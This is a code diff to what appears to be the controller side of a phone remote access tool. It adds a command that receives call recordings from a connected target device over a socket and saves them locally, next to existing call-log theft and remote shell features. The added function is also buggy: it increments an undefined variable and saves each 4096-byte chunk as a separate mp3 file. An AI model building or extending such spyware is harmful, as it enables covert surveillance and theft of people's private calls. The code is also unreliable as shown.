@@ -293,6 +293,30 @@ def callLogs(client):
     		if not os.path.getsize(filename):
     			os.remove(filename)
 
+def getCallRecodings(conn):
+    """
+    This function will fetch all the recoring files from the socket connnection and save it into /Dumps
+    """
+    number = 1
+    while True:
+        file_data = conn.recv(4096)
+
+        if not file_data:
+            if number == 1:
+                print("No file recived.")
+                return False
+            return True
+
+        file_name = f"file_{number}.mp3"
+        file_path = os.path.join("./Dumps", file_name)
+
+        with open(file_path, "wb") as file:
+            file.write(file_data)
+
+        print(f"File {file_name} received and saved.")
+        file_number += 1
+    
+
 def get_shell(ip,port):
     soc = socket.socket() 
     soc = socket.socket(type=socket.SOCK_STREAM)
@@ -336,6 +360,8 @@ def get_shell(ip,port):
                 callLogs(conn)
             elif(msg.strip() == "help"):
                 help()
+            elif(msg.strip() == "getCallRecodings"):
+                getCallRecodings(conn)
             else:
                 print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
             message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
